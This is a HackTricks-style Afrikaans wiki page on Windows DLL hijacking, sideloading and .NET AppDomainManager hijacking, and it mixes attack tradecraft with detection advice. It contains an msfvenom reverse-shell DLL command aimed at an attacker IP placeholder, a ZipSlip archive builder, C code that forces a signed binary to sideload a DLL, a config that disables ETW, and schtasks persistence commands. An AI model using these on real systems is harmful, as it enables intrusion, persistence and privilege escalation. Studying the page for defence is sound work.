# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese inligting

DLL Hijacking behels dat ’n vertroude toepassing gemanipuleer word om ’n kwaadwillige DLL te laai. Hierdie term omvat verskeie taktieke soos **DLL Spoofing, Injection en Side-Loading**. Dit word hoofsaaklik gebruik vir kode-uitvoering, om volharding te bewerkstellig en, minder algemeen, vir privilege escalation. Hoewel die fokus hier op escalation is, bly die metode van hijacking dieselfde ongeag die doelwit.

### Algemene tegnieke

Verskeie metodes word vir DLL hijacking gebruik. Hoe doeltreffend elkeen is, hang af van die toepassing se DLL-laaistrategie:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Vervang ’n egte DLL met ’n kwaadwillige een, en gebruik opsioneel DLL Proxying om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in ’n soekpad wat voor die wettige DLL nagegaan word, deur die toepassing se soekpatroon uit te buit.
3. **Phantom DLL Hijacking**: Skep ’n kwaadwillige DLL wat ’n toepassing sal laai omdat dit dink dat die DLL ’n vereiste DLL is wat nie bestaan nie.
4. **DLL Redirection**: Verander soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local`-lêers om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Vervang die wettige DLL met ’n kwaadwillige eweknie in die WinSxS-gids. Hierdie metode word dikwels met DLL side-loading geassosieer.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in ’n gebruikerbeheerde gids saam met die gekopieerde toepassing, soortgelyk aan Binary Proxy Execution-tegnieke.

’n Toepassing kan ook sy **eie DLL-loader** implementeer. ’n Bevoorregte proses kan ’n kindgids soos `Libraries` of `Plugins` lys en ’n gekose DLL aan ’n helper deurgee, onafhanklik van die normale Windows DLL-soekvolgorde. As ’n ander rekening lêers in daardie spesifieke gids kan skep, beskou dit as ’n leidraad vir verdere ondersoek: bevestig die prosesidentiteit, die gids se effektiewe ACL, die lêerseleksiereël en of ’n laai-operasie bereik kan word. ’n Skryfbare gids langs ’n uitvoerbare lêer bewys nie dat die proses DLL’s daarvandaan laai nie.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### PE-import grafting ná installasie

Klassieke side-loading laat die vertroude PE onveranderd en buit DLL-naamresolusie uit. **Import grafting** verander eerder ’n PE wat reeds deur die vertroude program gelaai is. Die aanvaller voeg ’n import-beskrywer en die gepaardgaande lookup-/IAT-inskrywings vir ’n aanvallerbeheerde DLL by. Wanneer Windows daardie afhanklikheid rekursief oplos, karteer dit die bygevoegde DLL en voer die DLL se initialiseringskode binne die andersins wettige proses uit. Dit is ’n PE-wysiging op skyf, nie dieselfde bewerking as om ’n lewendige IAT-funksiewyser met ’n runtime-hook te vervang nie.<sup>[[26]](#references)[[27]](#references)</sup>

Die gewysigde PE kan ’n tussenganger-DLL van ’n verskaffer wees, eerder as die uitvoerbare lêer wat deur die gebruiker of Task Scheduler begin word. ’n Herbruikbare ketting is:<sup>[[27]](#references)</sup>

1. Kopieer die wettige uitvoerbare lêer en sy afhanklikhede na ’n aanvallerbeheerde gids.
2. Pas een afhanklikheid se import-strukture aan sodat hulle na die kwaadwillige DLL verwys, terwyl die verwagte exports en normale gedrag van die afhanklikheid behoue bly.
3. Stel ’n autorun of geskeduleerde taak op om die wettige uitvoerbare lêer te begin. Die loader karteer die gewysigde afhanklikheid en daarna die nuut geïmporteerde DLL. Sien [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) vir taakopsporing.
4. Hou duur werk uit `DllMain`; die waargenome loader het ’n worker thread geskep en die gefaseerde dekripsie daar voortgesit.

Dit verskil van ’n supply-chain-kompromittering aan die verskafferkant wanneer die verskafferpakket skoon is en die import-wysiging ná installasie plaasvind. Triage elke module in die gefaseerde gids, nie net die gasheer-EXE nie: vergelyk afhanklikhede se import-lyste en hashes met ’n bekende goeie installasie, verifieer handtekeninge en ondersoek verskaffer-binaries wat vanaf onverwagte skryfbare liggings soos `C:\ProgramData` begin word. ’n Geskeduleerde taak wat na ’n gekopieerde crash reporter of updater in so ’n gids verwys, is ’n besonder nuttige aanknopingspunt.<sup>[[27]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + aanvallerassembly)

Klassieke DLL sideloading is nie die enigste manier om ’n vertroude **.NET Framework**-proses aanvallerkode te laat laai nie. As die teikenuitvoerbare lêer ’n **managed** toepassing is, raadpleeg die CLR ook ’n **toepassingskonfigurasielêer** wat na die uitvoerbare lêer vernoem is (byvoorbeeld `Setup.exe.config`). Dié lêer kan ’n pasgemaakte **AppDomainManager** definieer. As die konfigurasie na ’n aanvallerbeheerde assembly langs die EXE verwys, laai die CLR dit **voordat die toepassing se normale kodepad begin** en voer dit binne die vertroude proses uit.<sup>[[24]](#references)</sup>

Volgens Microsoft se .NET Framework-konfigurasieskema moet beide `<appDomainManagerAssembly>` en `<appDomainManagerType>` teenwoordig wees voordat die pasgemaakte manager gebruik word.<sup>[[16]](#references)[[17]](#references)</sup>

Minimale config:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimale bestuurder:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktiese aantekeninge:
- Hierdie tradecraft is spesifiek vir **.NET Framework**. Dit berus op CLR-konfigurasieparsing, nie op die Win32 DLL-soekvolgorde nie.
- Die gasheer moet werklik ’n **managed EXE** wees. Vinnige triage: `sigcheck -m target.exe`, `corflags target.exe`, of kyk vir die **CLR Runtime Header** in die PE-metadata.
- Die konfigurasielêernaam moet presies met die uitvoerbare lêer se naam ooreenstem (`<binary>.config`) en is gewoonlik **langs die EXE** geleë.
- Dit is nuttig met **ondertekende Microsoft-/verskafferbinaries**, omdat die vertroude EXE onaangeraak bly terwyl die kwaadwillige managed assembly in-process uitgevoer word.
- As jy reeds ’n skryfbare installer-/opdateringsgids het, kan AppDomainManager-hijacking as die **eerste fase** gebruik word, gevolg deur klassieke DLL-sideloading of reflective loading vir latere fases.

### AppDomainManager as ’n downloader + bootstrap vir ’n geskeduleerde taak

’n Praktiese indringingspatroon is om die vertroude managed EXE met sowel ’n kwaadwillige `*.config` as ’n kwaadwillige AppDomainManager-DLL te kombineer wat slegs as ’n **klein bootstrapper** optree:<sup>[[25]](#references)</sup>

1. ’n Gebruiker begin ’n ondertekende .NET-installer of -opdateringsprogram vanaf ’n geloofwaardige ligging, soos `%USERPROFILE%\Downloads`.
2. Die aangrensende konfigurasielêer veroorsaak dat die CLR die aanvaller se assembly laai **voordat** die wettige programlogika begin.
3. Die kwaadwillige manager voer ’n **padhek** uit (byvoorbeeld, gaan slegs voort as die gasheer-EXE vanaf `Downloads` loop, en laat die tweede fase slegs vanaf `%LOCALAPPDATA%` loop).
4. As die kontrole slaag, laai dit die werklike payload af na ’n gebruikerskryfbare pad, soos `%LOCALAPPDATA%\PerfWatson2.exe`, en bewerkstellig dit volharding met ’n geskeduleerde taak.

Waarom hierdie variant saak maak:
- Die ondertekende gasheer-EXE bly onveranderd, dus kan triage wat slegs die hoofbinary se hash nagaan die kompromittering miskyk.
- Eenvoudige **padgebaseerde anti-analise** is algemeen: om die ZIP/EXE/DLL-trio na Desktop, Temp of ’n sandbox-pad te verskuif, kan die ketting doelbewus breek.
- Die eerste-fase AppDomainManager-DLL kan klein en stilbly terwyl die werklike implant later afgelaai word.

Minimale voorbeeld van volharding wat dikwels met hierdie patroon gesien word:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Aantekeninge:
- ` /rl highest` beteken **hoogste beskikbare** vir daardie gebruiker/sessie; dit waarborg nie op sigself eskalasie na SYSTEM nie.
- Hierdie tegniek word dikwels beter gekategoriseer as **uitvoering/persistensie via misbruik van .NET-konfigurasie** as klassieke kaping van DLL-soekvolgorde weens 'n ontbrekende DLL, hoewel operateurs dikwels albei saam gebruik.

Opsporingspunte:
- Getekende .NET-uitvoerbare lêers wat vanaf **ZIP-onttrekkingspaaie**, `Downloads`, `%TEMP%` of ander vouers wat deur gebruikers geskryf kan word, geloods word en 'n **saamgeplaaste** `<exe>.config`-lêer het.
- Nuwe geskeduleerde take waarvan die aksie na `%LOCALAPPDATA%`, `%APPDATA%` of `Downloads` wys, en waarvan die name soos blaaier-/verskafferopdaterings lyk.
- Kortlewende bestuurde bootstrap-prosesse wat onmiddellik 'n ander EXE aflaai en dan `schtasks.exe` loods.
- Voorbeelde wat vroeg afsluit tensy die pad van die uitvoerbare lêer by 'n verwagte gebruikersprofielgids pas.

### Kaping van 'n bestaande geskeduleerde taak om die sideload-ketting weer te begin

Moenie vir persistensie net na **die skep van 'n nuwe taak** soek nie. Sommige inbraakgroepe wag totdat 'n wettige installeerder 'n **normale opdateringstaak** skep en **herskryf dan die taakaksie**, sodat die bestaande naam, outeur en sneller vir verdedigers bekend bly.

Herbruikbare werkvloei:
1. Installeer/laat loop die wettige sagteware en identifiseer die taak wat dit normaalweg skep.
2. Voer die taak se XML uit en teken die huidige `<Exec><Command>`- / `<Arguments>`-waardes aan.<sup>[[23]](#references)</sup>
3. Vervang slegs die aksie sodat die taak jou **vertroude gasheer-EXE** vanaf 'n tydelike gids skryfbaar deur die gebruiker begin; dié EXE laai dan die werklike loonvrag met sideloading of AppDomain.
4. Registreer dieselfde taaknaam weer in plaas daarvan om 'n nuwe, opvallende persistensie-artefak te skep.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Waarom dit moeiliker is om op te spoor:
- Die taaknaam kan steeds wettig lyk (byvoorbeeld dié van ’n verskaffer se opdateringsprogram).
- Die **Task Scheduler service** begin dit, dus sien kontrole van die ouer-/voorouerproses dikwels die verwagte skeduleringsketting in plaas van `explorer.exe`.
- DFIR-spanne wat net na **nuwe taakname** soek, kan ’n taak miskyk waarvan die registrasie reeds bestaan het, maar waarvan die aksie nou na `%LOCALAPPDATA%`, `%APPDATA%` of ’n ander pad onder die aanvaller se beheer wys.

Vinnige soekpunte:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergelyk die XML-lêers in `C:\Windows\System32\Tasks\*` en die metadata in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` met ’n basislyn.
- Genereer ’n waarskuwing wanneer ’n **opdateringstaak wat na ’n verskaffer s’n lyk** uit **gidse skryfbaar deur gebruikers** uitgevoer word, of wanneer dit ’n .NET EXE met ’n `*.config`-lêer in dieselfde gids begin.

> [!TIP]
> Vir ’n stap-vir-stap-ketting wat HTML-staging, AES-CTR-konfigurasies en .NET-implants bo-op DLL-sideloading plaas, raadpleeg die werkvloei hieronder.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Vind ontbrekende DLL's

Die algemeenste manier om ontbrekende DLL's in ’n stelsel te vind, is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te laat loop en die **volgende 2 filters** in te stel:

![Common Techniques - Finding missing Dlls: Die algemeenste manier om ontbrekende DLL's in 'n stelsel te vind, is om procmon van sysinternals te laat loop en die volgende 2 filters in te stel](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: Die algemeenste manier om ontbrekende DLL's in 'n stelsel te vind, is om procmon van sysinternals te laat loop en die volgende 2 filters in te stel](<../../../images/image (230).png>)

en net die **File System Activity** te wys:

![Common Techniques - Finding missing Dlls: en net die File System Activity te wys](<../../../images/image (153).png>)

As jy **in die algemeen na ontbrekende DLL's** soek, **laat** jy dit vir ’n paar **sekondes** loop.\
As jy na ’n **ontbrekende DLL in ’n spesifieke uitvoerbare lêer** soek, stel nog ’n filter in, soos **"Process Name" "contains" `<exec name>`**, voer dit uit en stop dan die vaslegging van gebeure.<sup>[[9]](#references)</sup>

## Misbruik van ontbrekende DLL's

Om voorregte te eskaleer, soek ’n **DLL wat ’n bevoorregte proses probeer laai** vanaf ’n plek waarna jy kan skryf. Dit kan gebeur wanneer jy beheer het oor ’n gids waarna eerste gesoek word, voor die gids met die wettige DLL, of wanneer die aangevraagde DLL nie bestaan nie en jy na een van die deursoekte gidse kan skryf.

### Dll Search Order

**In die** [**Microsoft-dokumentasie**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy lees hoe die DLL's spesifiek gelaai word.**

**Windows-toepassings** soek na DLL's deur ’n stel **vooraf gedefinieerde soekpaaie** in ’n bepaalde volgorde te volg. DLL-hijacking vind plaas wanneer ’n skadelike DLL strategies in een van hierdie gidse geplaas word, sodat dit voor die egte DLL gelaai word. Om dit te voorkom, moet die toepassing absolute paaie gebruik wanneer dit na die DLL's verwys wat dit benodig.

Hier is die **DLL-soekvolgorde op 32-bis**-stelsels:

1. Die gids waaruit die toepassing gelaai is.
2. Die stelselgids. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)-funksie om die pad na hierdie gids te kry.(_C:\Windows\System32_)
3. Die 16-bis-stelselgids. Daar is geen funksie om die pad na hierdie gids te kry nie, maar daarna word gesoek. (_C:\Windows\System_)
4. Die Windows-gids. Gebruik die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)-funksie om die pad na hierdie gids te kry.
   1. (_C:\Windows_)
5. Die huidige gids.
6. Die gidse wat in die PATH-omgewingsveranderlike gelys word. Let daarop dat dit nie die pad per toepassing insluit wat deur die **App Paths**-registersleutel gespesifiseer word nie. Die **App Paths**-sleutel word nie gebruik om die DLL-soekpad te bereken nie.

Dit is die **verstek**-soekvolgorde wanneer **SafeDllSearchMode** geaktiveer is. Wanneer dit gedeaktiveer is, skuif die huidige gids na die tweede plek. Om hierdie funksie te deaktiveer, skep die registerwaarde **SafeDllSearchMode** onder **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager** en stel dit op 0 (dit is by verstek geaktiveer).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)-funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** opgeroep word, begin die soektog in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.

Laastens kan ’n DLL volgens absolute pad eerder as naam gelaai word. In daardie geval soek Windows net op daardie pad na die DLL self; afhanklikhede wat volgens naam aangevra word, volg steeds die toepaslike soekvolgorde.

Daar is ander maniere om die soekvolgorde te verander, maar ek gaan dit nie hier verduidelik nie.

### Koppeling van ’n arbitrêre lêerskrywing aan ’n missing-DLL hijack

**Verwante tegniek:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Gebruik **ProcMon**-filters (`Process Name` = teiken-EXE, `Path` eindig met `.dll`, `Result` = `NAME NOT FOUND`) om die name van DLL's vas te lê waarna die proses soek, maar wat dit nie kan vind nie.<sup>[[14]](#references)</sup>
2. As die binêre lêer volgens ’n **skedule/diens** loop, sal ’n DLL met een van daardie name in die **toepassingsgids** (soekvolgorde-inskrywing #1) geplaas, tydens die volgende uitvoering gelaai word. In een .NET-skandeerdergeval het die proses na `hostfxr.dll` in `C:\samples\app\` gesoek voordat dit die werklike kopie vanaf `C:\Program Files\dotnet\fxr\...` gelaai het.
3. Bou ’n payload-DLL (bv. ’n reverse shell) met enige uitvoer: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. As jou primitive ’n **ZipSlip-styl arbitrêre skrywing** is, maak ’n ZIP waarvan die inskrywing buite die uitpakgids beland, sodat die DLL in die toepassingsgids geplaas word:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Lewer die argief by die gemonitorde inbox/share af; wanneer die geskeduleerde taak die proses herbegin, laai dit die kwaadwillige DLL en voer jou kode as die diensrekening uit.

### Afdwinging van sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

’n Gevorderde manier om die DLL-soekpad van ’n nuutgeskepte proses deterministies te beïnvloed, is om die DllPath-veld in RTL_USER_PROCESS_PARAMETERS in te stel wanneer die proses met ntdll se native APIs geskep word. Deur ’n aanvallerbeheerde gids hier te verskaf, kan ’n teikenproses wat ’n ingevoerde DLL volgens naam oplos (geen absolute pad nie en nie met die veilige laaivlae nie), gedwing word om ’n kwaadwillige DLL uit daardie gids te laai.

Kernidee
- Bou die prosesparameters met RtlCreateProcessParametersEx en verskaf ’n pasgemaakte DllPath wat na jou beheerde vouer wys (bv. die gids waar jou dropper/unpacker geleë is).
- Skep die proses met RtlCreateUserProcess. Wanneer die teikenbinary ’n DLL volgens naam oplos, sal die loader hierdie verskafte DllPath tydens resolusie raadpleeg, wat betroubare sideloading moontlik maak, selfs wanneer die kwaadwillige DLL nie langs die teiken-EXE geleë is nie.

Notas/beperkings
- Dit beïnvloed die child process wat geskep word; dit verskil van SetDllDirectory, wat slegs die huidige proses beïnvloed.
- Die teiken moet ’n DLL volgens naam invoer of LoadLibrary daarop gebruik (geen absolute pad nie en nie met LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories nie).
- KnownDLLs en hardgekodeerde absolute paaie kan nie gekaap word nie. Forwarded exports en SxS kan die voorrang verander.

Minimale C-voorbeeld (ntdll, wide strings, vereenvoudigde foutafhandeling):

<details>
<summary>Volledige C-voorbeeld: afdwinging van DLL-sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Operasionele gebruiksvoorbeeld
- Plaas ’n kwaadwillige xmllite.dll (wat die vereiste funksies uitvoer of na die regte een proxy) in jou DllPath-gids.
- Begin ’n ondertekende binêre lêer waarvan bekend is dat dit met behulp van die tegniek hierbo xmllite.dll op naam naslaan. Die loader los die import op via die verskafde DllPath en sideload jou DLL.

Hierdie tegniek is in werklike aanvalle waargeneem om meerfase-sideloading-kettings aan te dryf: ’n aanvanklike launcher plaas ’n helper-DLL, wat dan ’n deur Microsoft ondertekende, kaapbare binêre lêer met ’n pasgemaakte DllPath begin om die laai van die aanvaller se DLL uit ’n staging-gids af te dwing.<sup>[[6]](#references)</sup>


### .NET AppDomainManager-kaping via `.exe.config`

Vir **.NET Framework**-teikens kan sideloading **voor `Main()`** plaasvind sonder om geheue te patch deur die toepassing se aangrensende **`.exe.config`**-lêer te misbruik. In plaas daarvan om net op die Win32 DLL-soekvolgorde staat te maak, plaas die aanvaller ’n wettige .NET EXE langs ’n kwaadwillige config-lêer en een of meer assemblerings onder die aanvaller se beheer.

Hoe die ketting werk:<sup>[[15]](#references)[[22]](#references)</sup>
1. Die gasheer-EXE begin en die **CLR lees `<exe>.config`**.
2. Die config stel **`<appDomainManagerAssembly>`** en **`<appDomainManagerType>`** in sodat die runtime ’n `AppDomainManager` onder die aanvaller se beheer instansieer.
3. Die kwaadwillige bestuurder kry **uitvoering voor `Main()`** binne die vertroude gasheerproses.
4. Dieselfde config kan die CLR dwing om eers plaaslike assemblerings op te los (byvoorbeeld `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) en kan runtime-validering/telemetrie verswak sonder inline patching.

Patroon in die styl van ’n veldtog (presiese nesstruktuur kan volgens direktief / CLR-weergawe verskil):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Waarom dit nuttig is:
- **`<probing privatePath="."/>`** hou assembly-resolusie in die toepassingsgids, wat die gids in ’n voorspelbare sideloading-oppervlak omskep.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** verskuif uitvoering na aanvallerkode tydens CLR-inisialisering, voordat die wettige toepassing se logika loop.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kan ’n toepassing met volle vertroue toelaat om unsigned of gepeuterde assemblies te laai sonder ’n strong-name-valideringsfout.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** voorkom publisher-policy-herleiding na nuwer assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** maak runtime-keuse meer voorspelbaar.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** is besonder interessant omdat die **CLR sy eie ETW-sigbaarheid vanuit die konfigurasie deaktiveer**, eerder as dat die implant `EtwEventWrite` in geheue regmaak.

Operasionele patroon wat in onlangse veldtogte waargeneem is:
- Fase 1 plaas `setup.exe`, `setup.exe.config` en plaaslike assemblies.
- Fase 2 kopieer hulle na ’n geloofwaardige **AppData-opdateringsgids**, hernoem die gasheer na iets soos `update.exe`, en begin dit weer via ’n **geskeduleerde taak**.
- Fase 3 verifieer die uitvoeringskonteks (byvoorbeeld die verwagte ouerproses `svchost.exe` vanaf Task Scheduler) voordat die finale RAT DLL/export gelaai word.

Opsporingsidees:
- Getekende of andersins wettige **.NET-uitvoerbare lêers** wat met verdagte aangrensende **`.config`**-lêers in gebruiker-skryfbare liggings loop.
- `.config`-lêers wat **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** of **`etwEnable enabled="false"`** bevat.
- Geskeduleerde take wat hernoemde opdateringsbinaries vanaf **`%LOCALAPPDATA%`** of toepassingspesifieke `\bin\update\`-gidse herbegin.
- Ouer-/kind-proseskettings waar ’n geskeduleerde taak ’n vertroude .NET-gasheer begin wat onmiddellik nie-verskaffer-assemblies uit sy eie gids laai.

#### Uitsonderings op DLL-soekvolgorde volgens Windows-dokumentasie

Sekere uitsonderings op die standaard DLL-soekvolgorde word in Windows-dokumentasie genoem:

- Wanneer ’n **DLL met dieselfde naam as een wat reeds in geheue gelaai is** teëgekom word, omseil die stelsel die gewone soektog. In plaas daarvan kontroleer dit vir herleiding en ’n manifest voordat dit op die DLL wat reeds in geheue is, terugval. **In hierdie scenario soek die stelsel nie na die DLL nie**.
- Wanneer die DLL as ’n **bekende DLL** vir die huidige Windows-weergawe herken word, gebruik die stelsel sy weergawe van die bekende DLL, saam met enige afhanklike DLL’s, **sonder om daarna te soek**. Die registersleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bevat ’n lys van hierdie bekende DLL’s.
- As ’n **DLL afhanklikhede het**, word daar na hierdie afhanklike DLL’s gesoek asof hulle slegs deur hul **module name** aangedui is, ongeag of die aanvanklike DLL deur ’n volledige pad geïdentifiseer is.

### Voorregte-eskalasie

**Vereistes**:

- Identifiseer ’n proses wat onder **ander voorregte** loop of sal loop (horisontale of laterale beweging), en wat ’n **DLL kort**.
- Maak seker dat **skryftoegang** beskikbaar is vir enige **gids** waarin na die **DLL** gesoek sal word. Dit kan die uitvoerbare lêer se gids of ’n gids in die stelselpad wees.

Hierdie voorvereistes is by verstek ongewoon: bevoorregte uitvoerbare lêers het gewoonlik nie ontbrekende DLL-afhanklikhede nie, en standaardgebruikers kan gewoonlik nie na stelselsoekpadgidse skryf nie. Verkeerd gekonfigureerde omgewings kan steeds albei toestande blootlê.\
As daar aan die vereistes voldoen word, kyk na die [UACME](https://github.com/hfiref0x/UACME)-projek. Hoewel die hoofdoel daarvan UAC-bypass is, bevat dit DLL-hijacking-PoC’s vir spesifieke Windows-weergawes wat dikwels aangepas kan word vir die skryfbare gids wat jy gevind het.

Let daarop dat jy **jou toestemmings in ’n gids kan nagaan** met:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

En **kontroleer die toestemmings van alle vouers binne PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Jy kan ook die imports van ’n uitvoerbare lêer en die exports van ’n DLL nagaan met:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Vir 'n volledige gids oor hoe om **DLL Hijacking te misbruik om voorregte te eskaleer** met skryftoestemmings in 'n **System Path-lêergids**, kyk na:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outomatiese nutsmiddels

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal nagaan of jy skryftoestemmings het op enige lêergids binne die stelsel se PATH.\
Ander interessante outomatiese nutsmiddels om hierdie kwesbaarheid te ontdek, is **PowerSploit-funksies**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Voorbeeld

As jy 'n uitbuitbare scenario vind, is een van die belangrikste dinge om dit suksesvol uit te buit om **'n DLL te skep wat ten minste al die funksies uitvoer wat die uitvoerbare lêer daaruit sal invoer**. Hou egter in gedagte dat DLL Hijacking handig is om van Medium Integrity-vlak na High **(deur UAC te omseil)** te [**eskaleer**](../../authentication-credentials-uac-and-efs/index.html#uac), of van[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n geldige DLL te skep** in hierdie studie oor DLL Hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Verder vind jy in die **volgende afdeling** 'n paar **basiese DLL-kodes** wat nuttig kan wees as **sjablone**, of om 'n **DLL te skep met nie-verpligte funksies wat uitgevoer word**.

## **Skep en kompileer DLL's**

### **DLL Proxifying**

